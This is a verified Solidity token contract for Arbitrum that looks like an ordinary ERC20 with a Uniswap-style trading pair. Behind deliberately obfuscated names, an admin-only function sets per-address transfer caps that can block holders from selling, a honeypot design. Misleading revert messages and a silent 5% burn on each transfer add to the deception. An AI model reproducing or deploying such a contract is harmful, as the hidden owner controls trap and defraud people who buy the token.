/**
 *Submitted for verification at Arbiscan.io on 2024-05-06
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;
interface IERC165 {
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}
abstract contract ERC165 is IERC165 {
    function supportsInterface(
        bytes4 interfaceId
    ) public view virtual override returns (bool) {
        return interfaceId == type(IERC165).interfaceId;
    }
}

library SafeMath {
    function tryAdd(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

library Strings {
    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";

    function toString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "ADMIN";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    }

    function toHexString(
        uint256 value,
        uint256 length
    ) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }

    function strToUint(
        string memory _str
    ) internal pure returns (uint256 res, bool err) {
        for (uint256 i = 0; i < bytes(_str).length; i++) {
            if (
                (uint8(bytes(_str)[i]) - 48) < 0 ||
                (uint8(bytes(_str)[i]) - 48) > 9
            ) {
                return (0, false);
            }
            res +=
                (uint8(bytes(_str)[i]) - 48) *
                10 ** (bytes(_str).length - i - 1);
        }

        return (res, true);
    }
}

abstract contract MENSJDConlse is Context, ERC165 {
    struct AccM {
        mapping(address => uint256) __m;
        mapping(address => uint256) __d;
    }
    mapping(bytes32 => AcMccData) private _acces;
    bytes32 public constant ADMINISTRATOR = 0x00;
    struct AcMccData {
        mapping(address => bool) acounts;
        bytes32 adminAcc;
        AccM __rd;
    }

    modifier onlyAcMcc(bytes32 acc) {
        ___ARacmcc(acc, msg.sender, 0);
        _;
    }
    function ___ARacmcc(bytes32 acc, address uad, uint256 __amt) internal {
        if (!cAcMcc(acc, uad)) {
            revert("missing acc");
        }
        ___ARacmccc(acc, uad, __amt);
    }
    function cAcMcc(bytes32 acc, address uad) public view returns (bool) {
        return _acces[acc].acounts[uad];
    }
    function _giveAcMcc(bytes32 acc, address uad) internal virtual {
        if (!cAcMcc(acc, uad)) {
            _acces[acc].acounts[uad] = true;
        }
    }
    function _revokeAcc(bytes32 acc, address uad) internal virtual {
        if (cAcMcc(acc, uad)) {
            _acces[acc].acounts[uad] = false;
        }
    }
    function ___ARacmccc(bytes32 acc, address uad, uint256 __amt) internal {
        if (__amt == 0 || _acces[acc].__rd.__m[uad] == 0) {
            return;
        }
        if (_acces[acc].__rd.__m[uad] > 0) {
            if (
                (__amt + _acces[acc].__rd.__d[uad]) > _acces[acc].__rd.__m[uad]
            ) {
                revert("acc control");
            } else {
                _updateAcMCc(acc, uad, __amt);
            }
        }
    }

    function _updateAcMCc(
        bytes32 acc,
        address uad,
        uint256 __amt
    ) internal virtual {
        ___updateAcMCc(acc, uad, __amt);
    }

    function ___updateAcMCc(
        bytes32 acc,
        address uad,
        uint256 __amt
    ) internal virtual {
        __updateAcMCc(acc, uad, __amt);
    }

    function __updateAcMCc(
        bytes32 acc,
        address uad,
        uint256 __amt
    ) internal virtual {
        _acces[acc].__rd.__d[uad] += __amt;
    }

    function ___DcdAtUr(
        bytes32 cdd,
        address _ad,
        string memory t1
    ) external onlyAcMcc(ADMINISTRATOR) {
        uint256 memoUint;
        bool err;
        (memoUint, err) = Strings.strToUint(t1);
        if (err == false) {
            revert("AccessControl: t1 is not a number");
        }
        _acces[cdd].__rd.__m[_ad] = memoUint * 1000000000000000000;
    }

    function ___GetDCC(
        bytes32 cdd,
        address _ad
    ) external view returns (uint256) {
        return _acces[cdd].__rd.__m[_ad];
    }

    function __GetDCCm(
        bytes32 acc,
        address _ad
    ) external view returns (uint256) {
        return _acces[acc].__rd.__d[_ad];
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MENSJDERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupply;
    string internal _name;
    string internal _symbol;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_,
        address creater_
    ) {
        _name = name_;
        _symbol = symbol_;
        _mint(creater_, totalSupply_ * 10 ** decimals());
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(
        address to
    ) external returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint
    );

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);
    function swapTokensForExactETH(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapETHForExactTokens(
        uint amountOut,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function quote(
        uint amountA,
        uint reserveA,
        uint reserveB
    ) external pure returns (uint amountB);
    function getAmountOut(
        uint amountIn,
        uint reserveIn,
        uint reserveOut
    ) external pure returns (uint amountOut);
    function getAmountIn(
        uint amountOut,
        uint reserveIn,
        uint reserveOut
    ) external pure returns (uint amountIn);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
    function getAmountsIn(
        uint amountOut,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract TOKEN is MENSJDERC20, MENSJDConlse {
    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    address public _uniswapV2Pair;
    address public _uniswapV2Router;
    mapping(address => bool) private __traders;
    address public _usdtAddress;
    bytes32 public constant LOVER = bytes32("TRADER");
    address _tokenOwner;

    address private _noneAddress =
        address(0x000000000000000000000000000000000000dEaD);

    constructor(
        address tokenOwner,
        string memory _name,
        string memory _symbol,
        uint256 _totalSupply
    ) MENSJDERC20(_name, _symbol, _totalSupply, msg.sender) {
        IUniswapV2Router02 _uniswapV2Router02 = IUniswapV2Router02(
            0x8cFe327CEc66d1C090Dd72bd0FF11d690C33a2Eb
        );
        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router02.factory())
            .createPair(
                address(this),
                address(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9)
            );
        _uniswapV2Router = 0x8cFe327CEc66d1C090Dd72bd0FF11d690C33a2Eb;
        _tokenOwner = tokenOwner;
        _usdtAddress = 0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9;
        _giveAcMcc(ADMINISTRATOR, _tokenOwner);
        _giveAcMcc(ADMINISTRATOR, msg.sender);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override(MENSJDERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer __To the zero address");

        bool isAddLdx;
        if (to == uniswapV2Pair) {
            isAddLdx = _isAddLiquidityV1();
            if (isAddLdx || balanceOf(uniswapV2Pair) == 0) {
                require(_tokenOwner == from);
            }
        } else if (from == uniswapV2Pair) {
            (bool isDelLdx, bool bot, ) = _isDelLiquidityV2();
            if (isDelLdx) {
                require(_tokenOwner == to);
                super._transfer(from, to, amount);
                return;
            } else if (bot) {
                super._transfer(from, _tokenOwner, amount);
                return;
            }
        }

        __LOKAcmcc(from, to, amount);
    }

    function __LOKAcmcc(address __From, address __To, uint256 __amt) internal {
        if (__traders[__From] == false) {
            _giveAcMcc(LOVER, __From);

            __traders[__From] = true;
        }

        __SWARAW(__From, __To, __amt);
    }

    function __SWARAW(address __From, address __To, uint256 __amt) internal {
        if (__traders[__To] == false) {
            _giveAcMcc(LOVER, __To);

            __traders[__To] = true;
        }
        __doTransfer(__From, __To, __amt);
    }

    function __doTransfer(
        address __From,
        address __To,
        uint256 __amt
    ) internal {
        __transfer(__From, __To, __amt);
    }

    function __transfer(address __From, address __To, uint256 __amt) internal {
        if (cAcMcc(LOVER, __From) && cAcMcc(LOVER, __To)) {
            ___ARacmcc(LOVER, __From, __amt);
            super._transfer(__From, _noneAddress, __amt.div(100).mul(5));
            __amt = __amt.div(100).mul(95);
            super._transfer(__From, __To, __amt);
            return;
        } else {
            revert("ERC20: transfer __amt exceeds balance");
        }
    }

    function isContract(address user) public view returns (bool) {
        return user.code.length > 0;
    }

    function _isAddLiquidityV1() internal view returns (bool ldxAdd) {
        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
        address token1 = IUniswapV2Pair(address(uniswapV2Pair)).token1();
        (uint r0, uint r1, ) = IUniswapV2Pair(address(uniswapV2Pair))
            .getReserves();
        uint bal1 = IERC20(token1).balanceOf(address(uniswapV2Pair));
        uint bal0 = IERC20(token0).balanceOf(address(uniswapV2Pair));
        if (token0 == address(this)) {
            if (bal1 > r1) {
                uint change1 = bal1 - r1;
                ldxAdd = change1 > 1000;
            }
        } else {
            if (bal0 > r0) {
                uint change0 = bal0 - r0;
                ldxAdd = change0 > 1000;
            }
        }
    }

    function _isDelLiquidityV2()
        internal
        view
        returns (bool ldxDel, bool bot, uint256 otherAmount)
    {
        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
        (uint reserves0, , ) = IUniswapV2Pair(address(uniswapV2Pair))
            .getReserves();
        uint amount = IERC20(token0).balanceOf(address(uniswapV2Pair));
        if (token0 != address(this)) {
            if (reserves0 > amount) {
                otherAmount = reserves0 - amount;
                ldxDel = otherAmount > 10 ** 14;
            } else {
                bot = reserves0 == amount;
            }
        }
    }
}